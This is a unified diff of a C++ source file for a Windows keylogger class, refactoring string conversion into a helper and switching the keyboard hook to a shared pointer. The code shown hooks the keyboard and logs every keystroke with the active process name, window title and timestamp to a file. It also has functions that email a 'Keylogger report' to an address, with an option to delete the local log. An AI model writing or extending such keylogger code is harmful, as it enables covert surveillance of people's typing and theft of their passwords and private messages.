@@ -1,10 +1,9 @@
 #include "stdafx.h"
 #include "Keylogger.h"
 
-char Keylogger::charBuffer[1024];
 
 void Keylogger::start() {
-	hook = new Hook();
+	hook = make_shared<Hook>();
 	hook->setHook([this](const wchar_t key[]) {
 		keyboardHandler(key);
 	});
@@ -16,8 +15,8 @@ void Keylogger::keyboardHandler(const wchar_t* keyText) {
 	addWindowTimeStamps();
 		
 	auto symbol = keyText;
-	logFile << wcharToStr(keyText) << std::flush;
-	std::cout << wcharToStr(keyText) << std::flush;
+	logFile << StringUtilities::wcharToStr(keyText) << std::flush;
+	std::cout << StringUtilities::wcharToStr(keyText) << std::flush;
 }
 
 void Keylogger::addWindowTimeStamps() {
@@ -48,15 +47,13 @@ void Keylogger::addWindowTimeStamps() {
 		if (bufferTitle == nullptr || bufferTitle[0] == '\0') {
 			std::cout << "!!!!ploho!!!";
 		} else {
-			std::cout << "\n### " << wcharToStr(bufferProcessName) << " --- " << wcharToStr(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
+			std::cout << "\n### " << StringUtilities::wcharToStr(bufferProcessName) <<
+				" --- " << StringUtilities::wcharToStr(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
 		}
-		logFile << "\n### " << wcharToStr(bufferProcessName) << " --- " << wcharToStr(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
-	}
-}
 
-string Keylogger::wcharToStr(const wchar_t* str) {
-	CharToOemW(str, charBuffer);	
-	return string(charBuffer);
+		logFile << "\n### " << StringUtilities::wcharToStr(bufferProcessName) << " --- " <<
+			StringUtilities::wcharToStr(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
+	}
 }
 
 void Keylogger::stop() {
@@ -66,7 +63,6 @@ void Keylogger::stop() {
 
 Keylogger::~Keylogger() {
 	stop();
-	delete hook;
 }
 
 bool Keylogger::sendEmailCallback(std::string emailTo) {
@@ -76,6 +72,7 @@ bool Keylogger::sendEmailCallback(std::string emailTo) {
 
 bool Keylogger::sendEmailReport(bool deleteLocal) {
 	auto emailService = make_shared<EmailService>();
+
 	// Create email subject
 	std::stringstream subject;
 	subject << "Keylogger report. " << "Compname";
